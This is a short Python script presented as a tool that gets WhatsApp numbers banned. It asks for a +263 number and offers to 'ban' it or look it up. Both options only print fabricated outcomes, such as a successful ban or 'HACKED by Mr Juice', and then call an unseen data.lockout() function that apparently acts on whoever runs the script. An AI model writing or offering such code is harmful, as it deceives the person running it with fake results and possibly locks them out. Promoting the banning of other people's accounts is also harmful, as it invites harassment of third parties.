# Whatsapp number banning tool
# Created by Mr Juice
#
import os
import time
import sys
import data

print("Installing packages . . .")
os.system("clear")
os.system("pkg install cmatrix")
os.system("pip3 install colorama")
os.system("clear")
#
# Now importing colorama
#
import colorama
from colorama import Fore
#
def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)
def banner_display():
    print(f''' {Fore.CYAN}
           _             _         _                   
__      __| |__    __ _ | |_  ___ | |__    __ _  _ __  
\ \ /\ / /| '_ \  / _` || __|/ __|| '_ \  / _` || '_ \ 
 \ V  V / | | | || (_| || |_ \__ \| |_) || (_| || | | |
  \_/\_/  |_| |_| \__,_| \__||___/|_.__/  \__,_||_| |_|
   {Fore.YELLOW}                                                              
Coded by Mr Juice
Chat Me https://bio.link/mrjuice
Whatsapp number banning tool
{Fore.CYAN}
*************************************************
   {Fore.WHITE} ''')
banner_display()
#
#
def program():
    number = input("[+] pPut Number: +263")
    realnumber = "+263"+number
    check = number.isnumeric()
    lennber = len(number)
    if (check == True):
        if (lennber < 10 or lennber > 10):
            delay_print(f"{Fore.RED}Number must be 10 digits\n")
            program()
        elif (lennber==10):
            delay_print(f"{Fore.YELLOW}1) Ban number\n")
            delay_print(f"{Fore.YELLOW}2) Information about this number\n")
            option = input(f"{Fore.YELLOW}[+] Choose an option: ")
            if (option=="1"):
                delay_print(f"{Fore.YELLOW}Are you sure to ban "+realnumber+"?\n")
                yesorno1 = input("(Y/N): ")
                delay_print("Banning of "+realnumber+" is successfull!")
                data.lockout()

            elif (option=="2"):
                delay_print(f"{Fore.YELLOW}Gather information for "+realnumber+"?\n")
                yesorno2 = input("(Y/N): ")
                delay_print("Name: 47hxl-53r\nStatus: HACKED by Mr Juice!")
                data.lockout()

            else:
                delay_print(f"{Fore.RED}It's not an option\n")
                program()


    else:
        delay_print(f"{Fore.RED}Number is incorrect... Please try again . . .\n")
        print("")
        program()
program()
